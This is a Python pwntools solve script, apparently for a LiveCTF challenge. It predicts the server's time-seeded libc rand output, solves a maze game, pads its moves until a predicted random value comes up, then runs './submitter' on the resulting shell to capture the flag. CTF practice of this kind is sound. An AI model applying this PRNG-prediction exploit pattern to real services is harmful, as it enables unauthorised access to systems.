#!/usr/bin/env python3

from pwn import *
from ctypes import CDLL

WIDTH = 29
HEIGHT = 29

context.arch = 'amd64'

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

p = remote(HOST, int(PORT))
# libc = CDLL('/usr/lib/libc.so.6')
# libc = CDLL('./libc.so.6')
libc = CDLL('/lib/x86_64-linux-gnu/libc-2.31.so')

libc.srand(libc.time())

for i in range(0x24f):
    libc.rand()

p.sendlineafter(':', 'a')
p.recvuntil('maze.\n')

maze_str = p.recvn(900)
maze = []

start_pos = (0, 0)
end_pos = (0, 0)

for y in range(HEIGHT):
    maze.append([])
    for x in range(WIDTH):
        cell = maze_str[y * (WIDTH + 2) + x]
        if cell == ord('#'):
            maze[y].append(1)
        elif cell == ord('@'):
            start_pos = (y, x)
            maze[y].append(0)
        elif cell == ord('*'):
            end_pos = (y, x)
            maze[y].append(0)
        elif cell == ord('.'):
            maze[y].append(0)
        else:
            print(f'unknown cell: {cell}')
            exit()

path_so_far = []
start_i = 0
start_j = 0
end_i = 0
end_j = 0
found_path = None

def find_path(maze, start_pos, end_pos):
    global path_so_far, start_i, start_j, end_i, end_j, found_path

    path_so_far = []
    start_i, start_j = start_pos
    end_i, end_j = end_pos

    def go_to(i, j, direction):
        global path_so_far, end_i, end_j, maze, m, found_path
        if i < 0 or j < 0 or i > len(maze)-1 or j > len(maze[0])-1:
            return
        if (i, j) in path_so_far or maze[i][j] > 0:
            return
        path_so_far.append(direction)
        maze[i][j] = 2
        if (i, j) == (end_i, end_j):
            found_path = [i for i in path_so_far]
            path_so_far.pop()
            return
        else:
            go_to(i - 1, j, 'n')
            go_to(i + 1, j, 's')
            go_to(i, j + 1, 'e')
            go_to(i, j - 1, 'w')
        path_so_far.pop()
        return

    go_to(start_i, start_j, 'start')

find_path(maze, start_pos, end_pos)

for i in range(len(found_path) - 2):
    libc.rand()

for direction in found_path[1:-1]:
    # print(direction, end = ' ')
    p.sendlineafter(':', direction)

cnt = 0
while True:
    if libc.rand() % 1213 == 1212:
        break
    cnt += 1

if cnt % 2 == 1:
    print('odd fail')
    p.close()
    exit(0)

reversed_direction = {
    'w': 'e',
    'e': 'w',
    'n': 's',
    's': 'n'
}

for i in range(cnt // 2):
    last_move = found_path[-2]
    reversed_move = reversed_direction[last_move]

    p.sendlineafter(':', reversed_move)
    p.sendlineafter(':', last_move)

p.sendlineafter(':', found_path[-1])

p.sendline(b'./submitter')

for i in range(10):
    line = p.recvline()
    if b'LiveCTF{' in line:
        print(line.decode())
        exit(0)
p.interactive()